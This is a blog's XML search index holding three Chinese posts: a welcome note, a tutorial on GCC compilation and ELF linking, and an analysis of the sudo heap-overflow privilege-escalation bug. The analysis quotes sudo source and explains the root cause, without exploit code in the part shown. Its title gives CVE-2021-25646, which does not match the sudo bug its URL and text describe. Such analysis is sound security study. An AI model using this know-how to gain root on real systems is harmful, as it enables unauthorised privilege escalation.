<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2021/04/08/hello_world/</url>
    <content><![CDATA[<h1 id="一个新的开始"><a href="#一个新的开始" class="headerlink" title="一个新的开始"></a>一个新的开始</h1><blockquote>
<p>“我所有的欲望和沉思，都是这个宇宙缓缓呼出的气流。在这漫长的呼气结束之前，我的思维将一直存在。”</p>
</blockquote>
<p>​    几经周折终于面前搭建好了属于自己的博客，一个属于自己的空间。长久以来，我与外界的关系是作为一个消费者，消费物质和内容。2021年希望自己可以做一个生产者，创作者，把博客作为方法，输出和记录一些内容。</p>
<p><img src="https://i.loli.net/2021/04/09/4OQIETdyGWwLYbX.png" alt="rosie_2560_1600.png">    </p>
<p>:)</p>
<p>Hello world.</p>
]]></content>
      <categories>
        <category>my_space</category>
      </categories>
      <tags>
        <tag>say_something</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux代码编译过程</title>
    <url>/2021/04/12/Linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B/</url>
    <content><![CDATA[<h1 id="Linux下Hello-World的前生今世"><a href="#Linux下Hello-World的前生今世" class="headerlink" title="Linux下Hello World的前生今世"></a>Linux下Hello World的前生今世</h1><h2 id="代码引入"><a href="#代码引入" class="headerlink" title="代码引入"></a>代码引入</h2><p>hello.c</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[],<span class="keyword">char</span> *envp[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello World\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>linux环境下我们可以通过GCC编译hello.c:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -g hello.c -o hello</span><br></pre></td></tr></table></figure>

<p>当前目录先会生成hello可执行文件。</p>
<h3 id="main函数的三个参数"><a href="#main函数的三个参数" class="headerlink" title="main函数的三个参数"></a>main函数的三个参数</h3><p>int argc</p>
<p>int型变量，表示传递给main函数的参数数量。</p>
<p>char *argv</p>
<p>指针数组，每个指针指向各个具体的参数。</p>
<p>char*envp</p>
<p>环境变量，可以为程序运行过程中需要使用环境变量做参考。</p>
<p>Demo:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./hello   //执行该文件</span><br></pre></td></tr></table></figure>

<p>此时argc=1,表示只有一个参数输入</p>
<p>argv只有一个元素,argv[0]指向输入程序路径及名称: ./hello</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ./hello para_1</span><br></pre></td></tr></table></figure>

<p>此时argc=2,有两个参数传入</p>
<p>argc[0]指向输入程序路径及名称 “./hello”</p>
<p>argv[1]指向para_1字符串</p>
<h3 id="what’s-gcc"><a href="#what’s-gcc" class="headerlink" title="what’s gcc"></a>what’s gcc</h3><p>GCC是GNU Compiler Collection的缩写，GCC是一系列编译器的集合，是Linux操作系统的核心组件之一。GCC最初名为GNU C Compiler，当时它只是一款C语言的编译器，不过随着后续迭代，它支持C++、Fortran、Go等语言，GCC也因此成为一个编译器集合。GCC有以下特点：</p>
<ul>
<li><p>GCC支持的编程语言多。比如，<code>g++</code>是C++编译器，<code>gfortran</code>是Fortran编译器。</p>
</li>
<li><p>GCC支持的硬件全。GCC可以将源代码编译成x86_64、ARM、PowerPC等硬件架构平台的可执行文件。</p>
</li>
<li><p>GCC支持众多业界标准。GCC能很快支持最新的C++标准，GCC支持OpenMP、OpenACC。</p>
</li>
</ul>
<h2 id="编译过程分析"><a href="#编译过程分析" class="headerlink" title="编译过程分析"></a>编译过程分析</h2><p><img src="https://i.loli.net/2021/04/09/6Mdc9ytguaYkOZ4.png" alt="linux编译过程.png"></p>
<h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>预处理器CPP工具进行预处理</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cpp hello.c -o hello.i</span><br></pre></td></tr></table></figure>

<p>预编译主要处理源代码中以<code>#</code>开始的预编译指令，主要处理规则如下：</p>
<ul>
<li>处理<code>#include </code>预编译指令，将被包含的文件插入到该预编译指令的位置。这是一个递归的过程，如果被包含的文件还包含了其他文件，会递归地完成这个过程。</li>
<li>处理条件预编译指令，比如<code>#if</code>、<code>#ifdef</code>、<code>#elif</code>、<code>#else</code>、<code>#endif</code>。</li>
<li>删除<code>#define</code>，展开所有宏定义。</li>
<li>添加行号和文件名标识，以便于在编译过程中产生编译错误或者调试时都能够生成行号信息。</li>
</ul>
<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>gcc对预处理后的hello.i文件惊醒编译。编译的过程主要是进行词法分析、语法分析、语义分析，这背后涉及编译原理等一些内容。这里只进行编译，不汇编，可以生成硬件平台相关的汇编语言。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc -S hello.i -o hello.s</span><br></pre></td></tr></table></figure>

<p>它包含一个汇编语言程序，即将C语言程序编译成汇编语言程序。</p>
<h3 id="汇编"><a href="#汇编" class="headerlink" title="汇编"></a>汇编</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ as hello.s -o hello.o</span><br></pre></td></tr></table></figure>

<p>as工具将hello.s文件翻译为二进制代码。</p>
<p>虽然这个文件已经是二进制的机器码了，但是它仍然不能执行，因为它缺少系统运行所必须的库，比如C语言<code>printf()</code>对应的汇编语言的<code>puts</code>函数。确切的说，系统还不知道<code>puts</code>函数在内存中的具体位置。如果我们在一份源代码中使用了外部的函数或者变量，还需要重要的一步：链接。</p>
<h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ gcc hello.o -o hello</span><br></pre></td></tr></table></figure>

<p>该命令是基于<strong>动态链接</strong>的方式，生成的<code>hello</code>已经是一个可执行文件。实际上，这个命令隐藏了很多背后的内容。</p>
<p><code>main()</code>方法是C语言程序的入口，<code>crt1.o</code>这几个库是在处理<code>main()</code>方法调用之前和程序退出之后的事情，这需要与操作系统协作。在Linux中，一个新的程序都是由父进程调用<code>fork()</code>，生成一个子进程，然后再调用<code>execve()</code>，将可执行文件加载进来，才能被操作系统执行。所以，准确地说，<code>main()</code>方法是这个程序的入口，但仅仅从<code>main()</code>方法开始，并不能顺利执行这个程序。</p>
<p>链接器将多个目标文件合并成一个可执行目标文件，这个二进制文件包含加载程序到内存并运行的所有信息。</p>
<p>链接过程主要包含了两个步骤：</p>
<ol>
<li><p><strong>地址与空间分配（Address and Storage Allocation）</strong></p>
<p>这个过程中， 扫描所有的输入目标文件，获得它们的各个节的长度、属性、位置，并将输入目标文件中的符号表中所有的符号定义和符号引用收集起来，统一放到一个全局的符号表。这一步，链接器能够获得所有输入目标文件的节的长度，并将它们合并，计算出输出文件中各个节合并后的长度与位置，并建立映射关系。</p>
<p>这里引入可执行目标文件的概念。</p>
<p><img src="https://i.loli.net/2021/04/10/rPaJSl5UQHMc16s.png" alt="EOF.png"></p>
<p>.text:已编译程序的机器代码</p>
<p>.rodata:只读数据</p>
<p>.data:已初始化的全局和静态C变量</p>
<p>.bss:未初始化的全局和静态C变量</p>
<p>.symtab: 符号表，存放在程序中定义和引用的函数和全局变量的信息</p>
<p>.debug:调试符号表</p>
<p>可执行文件中的段是由目标文件中的节合并而来的，以下是链接器如何将它们的各个节合并到输出文件，也即输出文件中的空间如何分配给输入文件的两种方式。</p>
<p><strong>顺序叠加</strong></p>
<p><img src="https://i.loli.net/2021/04/10/s5acwxbHEJCvldq.png" alt="elf2.png"></p>
<p>虽然这种方法非常简单，但是它存在一个问题：在有很多输入文件的情况下，输出文件会有很多零散的节。这种做法非常浪费空间，因为每个节都需要有一定的地址和空间对齐要求。x86硬件的对齐要求是4KB。如果一个节的大小只有1个字节，它也要在内存在重用4KB。这样会造成大量内部碎片。所以不是一个好的方案。</p>
<p><strong>合并相似节</strong></p>
<p>一个更加实际的方法便是合并相同性质的节，比如：将所有输入文件的 <strong><code>.text</code>节</strong>合并到输出文件的 <strong><code>text</code>段</strong>（注意，此时出现了段和节两个概念），如下图所示。</p>
<p><img src="https://i.loli.net/2021/04/10/4gsBqv7fHbFXjMT.png" alt="elf1.png"></p>
<p>其中<code>.bss</code>节在目标文件和可执行文件中不占用文件的空间，但是它在装载时占用地址空间。事实上，这里的<strong>空间和地址</strong>有两层含义:</p>
<ol>
<li>在输出的可执行文件中的空间</li>
<li>在装载后的虚拟地址中的空间</li>
</ol>
<p>对于有实际数据的节，如<code>.text</code>和<code>.data</code>，它们在文件中和虚拟地址中都要分配空间，因为它们在这两者中都存在；对于<code>.bss</code>来，分配空间的意义只局限于虚拟地址空间，因为它在文件中并没有内容。<strong>我们在这里谈到的空间分配只关注于虚拟地址空间（见下图）的分配</strong>，因为这关系到链接器后面的关于地址计算的步骤，而可执行文件本身的空间分配与链接的关系并不大。</p>
<p><img src="https://i.loli.net/2021/04/10/FP4Nlwm1QWxpgzs.png" alt="dizhi.png"></p>
<p>现在的链接器空间分配的策略基本上都采用“合并相似节”的方法，使用这种方法的链接器一般采用一种叫 <strong>两步链接（Two-pass Linking）</strong> 的方法。即整个链接过程分为地址与空间分配和符号解析、重定位。</p>
</li>
<li><p><strong>符号解析（Symbol Resolution）</strong>和<strong>重定位（Relocation）</strong></p>
<p>使用前一步中收集到的所有信息，读取输入文件中节的输数据、重定位信息，并且进行符号解析与重定位、调整代码、调整代码中的地址等。重定位是链接过程的核心。在地址与空间分配步骤完成之后，相似权限的节会被合并成段，并生成了 <strong>程序头表（Program Header Table）</strong> 结构。如下图可执行文件结构所示，主要生成两个段：代码段（ <code>text</code>段）、数据段（ <code>data</code>段 ）。</p>
<p><img src="https://i.loli.net/2021/04/10/JASN3iGExlVrhv8.png" alt="different-elf-type.png"></p>
<p><img src="https://i.loli.net/2021/04/10/4gsBqv7fHbFXjMT.png" alt="elf1.png"></p>
<p><strong>符号解析</strong></p>
<p>重定位的过程是伴随着符号解析的，这里先介绍符号解析。</p>
<p>链接器解析符号引用的方法是将每个引用与它输入的可重定位目标文件的符号表中的一个确定的符号定义关联起来。对那些和引用定义在相同模块的局部符号的引用，符号解析是非常简单的。编译器只允许每个模块中每个局部符号有一个定义。静态局部变量也会有本地链接器符号，编译器还要确保它们拥有唯一的名字。</p>
<p>然而，对于全局符号的解析要复杂得多。当编译器遇到一个不是在当前模块中定义的符号（变量或函数名）时，会假设该符号是在其他某个模块中定义的，生成一个链接器符号表条目，并把它交给链接器处理。如果链接器在它的任何输入模块中都找不到这个被引用符号的定义，就输出一条错误信息并终止。</p>
<p>多重定义的全局符号解析在此不做介绍。</p>
<p><strong>重定位</strong></p>
<p>链接的前两步完成之后，链接器就已经确定所有符号的虚拟地址了，那么链接器就可以根据符号的地址对每个需要重定位的指令进行地址修正。</p>
<p>那么链接器如何知道哪些指令是要被调整的呢？事实上，我们前面提到的ELF文件中的 <strong>重定位表（Relocation Table）</strong> 专门用来保存这些与重定位相关的信息。</p>
<p>对于可重定位的ELF文件来说，它必须包含重定位表，用来描述如何修改相应的节的内容。对于每个要被重定位的ELF节都有一个对应的重定位表。如果<code>.text</code>节需要被重定位，则会有一个相对应叫<code>.rel.text</code>的节保存了代码节的重定位表；如果<code>.data</code>节需要被重定位，则会有一个相对应的<code>.rel.tdata</code>的节保存了数据节的重定位表。</p>
</li>
</ol>
<p>链接可分为静态链接和动态链接</p>
<h5 id="静态链接"><a href="#静态链接" class="headerlink" title="静态链接"></a>静态链接</h5><p>简单来说，静态链接就是在程序加载前，将所依赖的第三方库函数都打包到了一起，形成一个非常大的可执行文件。如下图所示为最基本的静态链接过程示意图。每个模块的源代码文件（如<code>.c</code>）文件经过编译器编译成<strong>目标文件</strong>（Object File，一般扩展名为<code>.o</code>或<code>.obj</code>）。目标文件和 <strong>库（Library）</strong> 一起链接形成最终的可执行文件。其中，最常见的库就是<strong>运行时库（Runtime Library）</strong>，它是支持程序运行的基本函数的集合。<strong>库本质上是一组目标文件的包，由一些最常用的代码编译成目标文件后打包而成</strong>。</p>
<p><img src="https://i.loli.net/2021/04/10/Cy1xEdQl6TVZqwS.png" alt="linking.jpg"></p>
<h5 id="动态链接"><a href="#动态链接" class="headerlink" title="动态链接"></a>动态链接</h5><p>动态链接是在运行时，发现用到某些库中的某些函数时，再从这些第三方库中读取自己所需的方法。</p>
<p><strong>动态链接的基本实现</strong></p>
<p>动态链接涉及运行时的链接以及多个文件的装载，必需要有操作系统的支持。因为动态链接的情况下，进程的虚拟地址空间的分布会比静态链接情况下更为复杂，还有一些存储管理、内存共享、进程线程等机制在动态链接下也会有一些微妙的变化。</p>
<p>目前，主流操作系统都支持动态链接。在Linux中，ELF动态链接文件被称为 <strong>动态共享对象（DSO，Dynamic Shared Objects）</strong>，一般以<code>.so</code>为后缀；在Windows中，动态链接文件被称为 <strong>动态链接库（Dynamic Linking Library）</strong>，一般以<code>.dll</code>为后缀。</p>
<p>在Linux中，常用的C语言库的运行库glibc，其动态链接形式的版本保留在 <code>/lib</code>目录下，文件名为 <code>libc.so</code>。整个系统只保留一份C语言动态链接文件<code>libc.so</code>，所有的C语言编写的、动态链接的程序都可以在运行时使用它。当程序被装载时，系统的<strong>动态链接器</strong>会将程序所需要的所有动态链接库装载到进程的地址空间，并将程序中所有未解析的符号绑定到相应的动态链接库中，并进行重定位。</p>
<p><strong>动态链接程序运行时地址空间分布</strong></p>
<p>对于静态链接的可执行文件来说，整个进程只有一个文件要被映射，即可执行文件。而对于动态链接，除了可执行文件，还有它所依赖的共享目标文件。</p>
<p>关于共享目标文件在内存中的地址分配，主要有两种解决方案，分别是：</p>
<ul>
<li><strong>静态共享库（Static Shared Library）</strong>（地址固定）</li>
<li><strong>动态共享库（Dynamic Shared Libary）</strong>（地址不固定）</li>
</ul>
<p><strong>静态共享库</strong></p>
<p>静态共享库的做法是将程序的各个模块统一交给操作系统进行管理，操作系统在<strong>某个特定的地址</strong>划分出一些地址块，为那些已知的模块预留足够的空间。因为这个地址对于不同的应用程序来说，都是固定的，所以称之为<strong>静态</strong>。</p>
<p>但是静态共享库的目标地址会导致地址冲突、升级等问题。</p>
<p><strong>动态共享库</strong></p>
<p>采用动态共享库的方式，也称为<strong>装载时重定位（Load Time Relocation）</strong>。其基本思路是：<strong>在链接时，对所有绝对地址的引用都不作重定位，而把这一步推迟到装载时再完成。一旦模块装载地址确定，即目标地址确定，那么系统就对程序中所有的绝对地址引用进行重定位。</strong></p>
<p>但是这种方式也存在一些问题。比如，动态链接模块被装载映射至虚拟空间后，指令部分是在多个进程间共享的，由于装载时重定位的方法需要修改指令，所以没有办法做到同一份指令被多个进程共享，因为指令被重定位后对于每个进程来说都是不同的。</p>
<p>然后，动态链接库中的代码是共享的，但是其中的可修改数据部分对于不同进程来说是由多个副本的。基于此，一种名为<strong>地址无关代码</strong>的技术被提出以克服这个问题。</p>
<p><strong>与地址无关</strong></p>
<p>无论何种操作系统上，使用动态链接生成的目标文件中凡是涉及第三方库的函数调用都是<strong>地址无关</strong>的。我们自己编写的程序名为hello.c，hello.c中调用了C标准库的<code>printf()</code>，在生成的目标文件中，不会立即确定<code>printf()</code>的具体地址，而是在运行时去装载这个函数，在装载阶段确定<code>printf()</code>的地址。这里提到的地址指的是进程在内存上的虚拟地址。动态链接库的函数地址在编译时是不确定的，在装载时，装载器根据当前地址空间情况，动态地分配一块虚拟地址空间。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>在会写一个C程序，也要了解一个C代码是如何从ASCII文件一步步变为可执行文件的过程。</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>编译过程</tag>
        <tag>链接</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2021-25646堆溢出漏洞复现及分析</title>
    <url>/2021/04/10/CVE-2021-3156/</url>
    <content><![CDATA[<h1 id="CVE-2021-25646堆溢出漏洞复现及分析"><a href="#CVE-2021-25646堆溢出漏洞复现及分析" class="headerlink" title="CVE-2021-25646堆溢出漏洞复现及分析"></a>CVE-2021-25646堆溢出漏洞复现及分析</h1><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>​        当在类Unix的操作系统上执行命令时，非root用户可以使用sudo命令来以root用户身份执行命令。由于sudo错误地在参数中转义了反斜杠导致堆缓冲区溢出，从而允许任何本地用户（无论是否在sudoers文件中）获得root权限，无需进行身份验证，且攻击者不需要知道用户密码。</p>
<p>​    影响范围：</p>
<p>​    Sudo 1.8.2 - 1.8.31p2</p>
<p>​    Sudo 1.9.0 - 1.9.5p1</p>
<h4 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h4><p>​    对于bash而言假如我们希望执行某个命令可以使用<code>bash -c [command]</code>来执行，如果我们希望以root的权限去执行某个命令的话可以直接<code>sudo [cmd]</code>，而如果我们希望以<code>shell</code>模式去执行某个命令的时候，可以使用<code>sudo -i</code>或者<code>sudo -s</code>参数，在参数说明里我们可以看到<code>-i, --login run login shell as the target user; a command may also be specified， -s, --shell run shell as the target user; a command may also be specified</code>，当我们使用上述参数时对于sudo的flags而言有两种情况：</p>
<ol>
<li><p>使用<code>sudo -s</code>，设置<code>MO    DE_SHELL</code></p>
</li>
<li><p>使用<code>sudo -i</code>，设置<code>MODE_SHELL|MODE_LOGIN_SHELL</code></p>
<p>​    在<code>src/parse_args.c</code>里我们可以看到对于这种模式的参数处理，处理方式为将参数按照空格拼接起来，对于一些元字符使用反斜线进行转义处理，最终覆写了argv为ac这个指针数组。</p>
</li>
</ol>
<p>​    源码分析：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     * For shell mode we need to rewrite argv</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">	<span class="keyword">char</span> **av, *cmnd = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">int</span> ac = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (argc != <span class="number">0</span>) &#123;</span><br><span class="line">	    <span class="comment">/* shell -c &quot;command&quot; */</span></span><br><span class="line">	    <span class="keyword">char</span> *src, *dst;</span><br><span class="line">        <span class="comment">//得到命令的长度</span></span><br><span class="line">	    <span class="keyword">size_t</span> cmnd_size = (<span class="keyword">size_t</span>) (argv[argc - <span class="number">1</span>] - argv[<span class="number">0</span>]) +</span><br><span class="line">		<span class="built_in">strlen</span>(argv[argc - <span class="number">1</span>]) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	    cmnd = dst = reallocarray(<span class="literal">NULL</span>, cmnd_size, <span class="number">2</span>);</span><br><span class="line">	    <span class="keyword">if</span> (cmnd == <span class="literal">NULL</span>)</span><br><span class="line">		sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">	    <span class="keyword">if</span> (!gc_add(GC_PTR, cmnd))</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">//拼接命令并且处理转移符</span></span><br><span class="line">	    <span class="keyword">for</span> (av = argv; *av != <span class="literal">NULL</span>; av++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (src = *av; *src != <span class="string">&#x27;\0&#x27;</span>; src++) &#123;</span><br><span class="line">                <span class="comment">/* quote potential meta characters */</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">isalnum</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)*src) &amp;&amp; *src != <span class="string">&#x27;_&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;-&#x27;</span> &amp;&amp; *src != <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">                    *dst++ = <span class="string">&#x27;\\&#x27;</span>;<span class="comment">//处理转义字符，&#x27;\\&#x27;表示反斜线</span></span><br><span class="line">                *dst++ = *src;</span><br><span class="line">            &#125;</span><br><span class="line">		*dst++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line">	    <span class="keyword">if</span> (cmnd != dst)</span><br><span class="line">		    dst--;  <span class="comment">/* replace last space with a NUL */</span></span><br><span class="line">	    *dst = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	    ac += <span class="number">2</span>; <span class="comment">/* -c cmnd */</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//上述处理完毕后结果保存在dst指针指向的内存</span></span><br><span class="line">	av = reallocarray(<span class="literal">NULL</span>, ac + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span> *));</span><br><span class="line">    <span class="comment">//分配新的内存保存拼接的命令</span></span><br><span class="line">	<span class="keyword">if</span> (av == <span class="literal">NULL</span>)</span><br><span class="line">	    sudo_fatalx(U_(<span class="string">&quot;%s: %s&quot;</span>), __func__, U_(<span class="string">&quot;unable to allocate memory&quot;</span>));</span><br><span class="line">	<span class="keyword">if</span> (!gc_add(GC_PTR, av))</span><br><span class="line">	    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	av[<span class="number">0</span>] = (<span class="keyword">char</span> *)user_details.shell; <span class="comment">/* plugin may override shell */</span></span><br><span class="line">	<span class="keyword">if</span> (cmnd != <span class="literal">NULL</span>) &#123;</span><br><span class="line">	    av[<span class="number">1</span>] = <span class="string">&quot;-c&quot;</span>;</span><br><span class="line">	    av[<span class="number">2</span>] = cmnd;</span><br><span class="line">	&#125;</span><br><span class="line">	av[ac] = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//最后的形式为 shell -c cmnd(shell和环境变量相关，比如我这里是zsh，shell为/usr/bin/zsh)</span></span><br><span class="line">    <span class="comment">//最终用av覆写argv</span></span><br><span class="line">	argv = av;</span><br><span class="line">	argc = ac;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​        随后在<code>sudoers.c</code>中的<code>sudoers_policy_main</code>函数中调用<code>set_cmnd</code>将命令行参数存放在一个堆上的数据结构<code>user_args</code>中，这里也对元字符做了处理，假如不是<code>\\</code>+<code>space</code>的形式就跳过元字符，否则拷贝到<code>*to</code>。那么假如我们的命令行参数以<code>\\</code>结尾，那么<code>from[0]=&#39;\\&#39;;from[1]=NULL(注意NULL并非sapce范围)</code>，此时from++指向空字符，下面将空字符拷贝到了<code>*to</code>并且<code>from++</code>后执行了NULL后面的字符，此时再次进行while循环判断时很明显这里是可以继续进入循环的(如果后一个字符不为NULL)，从而赋值得以继续进行，从而产生了溢出。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * When running a command via a shell, the sudo front-end</span></span><br><span class="line"><span class="comment">		 * escapes potential meta chars.  We unescape non-spaces</span></span><br><span class="line"><span class="comment">		 * for sudoers matching and logging purposes.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">			<span class="keyword">for</span> (to = user_args, av = NewArgv + <span class="number">1</span>; (from = *av); av++) &#123;</span><br><span class="line">				<span class="keyword">while</span> (*from) &#123;</span><br><span class="line">				<span class="keyword">if</span> (from[<span class="number">0</span>] == <span class="string">&#x27;\\&#x27;</span> &amp;&amp; !<span class="built_in">isspace</span>((<span class="keyword">unsigned</span> <span class="keyword">char</span>)from[<span class="number">1</span>]))</span><br><span class="line">					from++;</span><br><span class="line">				*to++ = *from++;</span><br><span class="line">				&#125;</span><br><span class="line">				*to++ = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			*--to = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>set_cmnd()存在越界写，溢出user_args堆缓冲区（size是在852-853行中计算）。根本原因就是，sudo默认 \ 后面肯定跟着元字符，实际上后面只有1个结束符。</strong></p>
<p>当<code>from</code>指向<code>\</code>时，from[1]指向NULL字节，from[2]指向的就是环境变量的第一个字节了，执行<code>*too=*from++</code>，可以将后面的NULL字节拷贝到<code>user_args</code>的堆中，且让<code>from++</code>，从而避开了<code>while(*from）</code>判断是否读到NULL字节的检测，由于参数后面紧跟环境变量的值，因此通过<strong>设置环境变量的值来覆盖user_args堆后面的数据</strong>。</p>
<p>​    上述是我们的理论分析，在理论角度上看漏洞是存在的，但是我们在之前的漏洞中也见到过由于无法创造漏洞利用场景(比如我想提权但是exp里需要某个root用户给的capability)，这样的洞就非常鸡肋。那么在我们的分析里有几个理想条件，那么最后的这个场景，即反斜线作为cmd-line的最后一个字符从理论上来说是无法实现的，这里要求我们有<code>MODE_SHELL|MODE_LOGIN_SHELL</code>，而假如flag包含<code>MODE_SHELL</code>的话在我们之前的<code>parse_args</code>参数解析中就会将所有元字符给转义掉，也就是说会有两个反斜线，我们再按照代码走一遍会发现这样循环末尾的<code>*from=NULL</code>，因此会跳出循环。</p>
<p>​    再仔细对比一下二者的条件，二者的条件略有不同。我们的问题在于能否设置flag为<code>MODE_SHELL</code>以及<code>MODE_RUN</code>或者<code>MODE_EDIT</code>或者<code>MODE_CHECK</code>。</p>
<p>​    再看下解析参数的部分会发现好像还是不太行，假如我们使用<code>-e</code>参数设置<code>MODE_EDIT</code>或者使用<code>-l</code>参数设置<code>MODE_CHECK</code>，我们的<code>MODE_SHELL</code>参数就会被从<code>valid_flags</code>去掉。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//bug condition</span></span><br><span class="line"><span class="keyword">if</span> (sudo_mode &amp; (MODE_RUN | MODE_EDIT | MODE_CHECK)) &#123; </span><br><span class="line">            <span class="comment">//... </span></span><br><span class="line">           <span class="keyword">if</span> (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) &#123; </span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//escape meta char condition</span></span><br><span class="line"><span class="keyword">if</span> (ISSET(mode, MODE_RUN) &amp;&amp; ISSET(flags, MODE_SHELL)) &#123;</span><br><span class="line">    <span class="comment">//.. </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_NONINTERACTIVE	0x00800000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MODE_SHELL		0x00020000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//parse_args.c</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;e&#x27;</span>:</span><br><span class="line">		    <span class="keyword">if</span> (mode &amp;&amp; mode != MODE_EDIT)</span><br><span class="line">			usage_excl(<span class="number">1</span>);</span><br><span class="line">		    mode = MODE_EDIT;</span><br><span class="line">		    sudo_settings[ARG_SUDOEDIT].value = <span class="string">&quot;true&quot;</span>;</span><br><span class="line">		    valid_flags = MODE_NONINTERACTIVE;<span class="comment">//这里</span></span><br><span class="line">		    <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">case</span> <span class="string">&#x27;l&#x27;</span>:</span><br><span class="line">		    <span class="keyword">if</span> (mode) &#123;</span><br><span class="line">			<span class="keyword">if</span> (mode == MODE_LIST)</span><br><span class="line">			    SET(flags, MODE_LONG_LIST);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">			    usage_excl(<span class="number">1</span>);</span><br><span class="line">		    &#125;</span><br><span class="line">		    mode = MODE_LIST;</span><br><span class="line">		    valid_flags = MODE_NONINTERACTIVE|MODE_LONG_LIST;<span class="comment">//这里</span></span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; valid_flags) != flags)</span><br><span class="line">	usage(<span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​    最后作者发现了一个可以利用的地方(盲猜是通过全局搜flag找到的)，那就是如果我们去执行sudoedit，<code>parse_args</code>函数会自动设置<code>MODE_EDIT</code>，并且不会重置<code>valid_flags</code>，而<code>valid_flags</code>默认包含了<code>MODE_SHELL</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Default flags allowed when running a command.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> valid_flags = DEFAULT_VALID_FLAGS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* First, check to see if we were invoked as &quot;sudoedit&quot;. */</span></span><br><span class="line">    proglen = <span class="built_in">strlen</span>(progname);</span><br><span class="line">    <span 